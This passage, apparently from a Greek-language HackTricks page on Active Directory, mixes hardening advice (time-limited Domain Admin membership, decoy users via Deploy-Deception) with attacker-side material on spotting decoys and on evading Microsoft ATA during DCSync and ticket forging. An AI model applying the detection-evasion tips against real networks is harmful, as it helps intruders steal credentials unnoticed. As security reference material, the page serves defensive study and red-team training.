- **Service Account Privileges**: Οι υπηρεσίες δεν πρέπει να τρέχουν με Domain Admin (DA) privileges για διατήρηση της ασφάλειας.
- **Temporal Privilege Limitation**: Για εργασίες που απαιτούν DA privileges, η διάρκεια τους πρέπει να είναι περιορισμένη. Αυτό μπορεί να επιτευχθεί με: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`

### **Υλοποίηση τεχνικών deception**

- Η υλοποίηση deception περιλαμβάνει τη ρύθμιση παγίδων, όπως decoy users ή computers, με χαρακτηριστικά όπως passwords που δεν λήγουν ή που χαρακτηρίζονται ως Trusted for Delegation. Μια λεπτομερής προσέγγιση περιλαμβάνει τη δημιουργία χρηστών με συγκεκριμένα δικαιώματα ή την προσθήκη τους σε ομάδες υψηλών προνομίων.
- Ένα πρακτικό παράδειγμα περιλαμβάνει τη χρήση εργαλείων όπως: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Περισσότερα για την ανάπτυξη deception techniques μπορείτε να βρείτε στο [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Ανίχνευση Deception**

- **Για αντικείμενα χρήστη**: Υποπτοί δείκτες περιλαμβάνουν μη τυπικό ObjectSID, σπάνιες συνδέσεις, ημερομηνίες δημιουργίας και χαμηλό πλήθος bad password attempts.
- **Γενικοί Δείκτες**: Η σύγκριση attributes πιθανών decoy αντικειμένων με εκείνα των γνήσιων μπορεί να αποκαλύψει ασυνέπειες. Εργαλεία όπως [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) μπορούν να βοηθήσουν στον εντοπισμό τέτοιων deception.

### **Παράκαμψη Συστημάτων Εντοπισμού**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: Αποφυγή session enumeration σε Domain Controllers για αποτροπή εντοπισμού από ATA.
- **Ticket Impersonation**: Η χρήση **aes** keys για δημιουργία ticket βοηθά στην αποφυγή εντοπισμού, καθώς δεν γίνεται υποβάθμιση σε NTLM.
- **DCSync Attacks**: Συνίσταται η εκτέλεση από μη Domain Controller για αποφυγή εντοπισμού από ATA, καθώς η άμεση εκτέλεση από Domain Controller θα προκαλέσει ειδοποιήσεις.

## Αναφορές

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Hashcat](https://github.com/hashcat/hashcat)

{{#include ../../banners/hacktricks-training.md}}
